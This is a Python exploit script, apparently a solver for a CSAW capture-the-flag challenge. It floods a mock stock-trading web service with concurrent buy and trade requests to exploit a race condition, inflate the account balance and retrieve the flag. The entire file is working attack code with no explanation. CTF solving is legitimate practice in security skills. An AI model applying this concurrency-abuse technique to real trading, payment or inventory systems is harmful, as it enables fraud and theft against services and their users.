import grequests as req
import json
from time import sleep, time
import threading
import random
import pwn

ADDRESS = "http://stonk.csaw.io"
PORT = int(pwn.args.PORT)
#ADDRESS = "http://127.0.0.1"
#PORT = 4657

def subdomain(path):
    return ADDRESS + ":" + str(PORT) + path

def request(path, data={}):
    r = req.post(subdomain(path), data=data)
    r = req.map([r])[0]
    return r.text

stocka = "CRUISEBOOK"
stocka = "AAPLISH"
stocka = "FACEFLOP"

toc = time()
main = str(random.randint(0, 1<<64))
status = json.loads(request("/login", data={"key": main}))
print(status)

while True:
    key = str(random.randint(0, 1<<64))
    reqs = []
    for i in range(12):
        reqs.append(req.post(subdomain("/buy"), data={"key": key, "stock": "GOOBER"}))
    reqs = list(map(lambda r: r.text, req.map(reqs)))
    print(reqs)
    status = json.loads(request("/login", data={"key": key}))
    if status.get("GOOBER") > 10:
        tic = time()
        print(f"HIT: {tic - toc}")
        toc = tic

        a = "BURPSHARKHAT"
        b = "BROOKING"

        for _ in range(6):
            reqs = [req.post(subdomain("/buy"), data={"key": main, "stock": a}) for _ in range(11)]
            reqs = list(map(lambda r: r.text, req.map(reqs)))
            print(f"BUY:  {reqs}")
            #print(request("/trade", data={"key": main, "stock": "CRUISEBOOK", "stock1": "AAPLISH"}))
            reqs = [req.post(subdomain("/trade"), data={"key": main, "stock": a, "stock1": b}) for _ in range(1)]
            reqs = list(map(lambda r: r.text, req.map(reqs)))
            print(f"TRADE: {reqs}")
            status = json.loads(request("/login", data={"key": main}))
            print(status)

            sleep(9)

        if status.get(b) == 6:
            reqs = [req.post(subdomain("/sell"), data={"key": main, "stock": b}) for _ in range(5)] + [req.post(subdomain("/sell"), data={"key": main, "stock": a})]
            reqs = list(map(lambda r: r.text, req.map(reqs)))
            print(reqs)

            while (money := json.loads(request("/login", data={"key": main})).get("balance")) < 9001: print(money)

            print(request("/flag", data={"key": main}))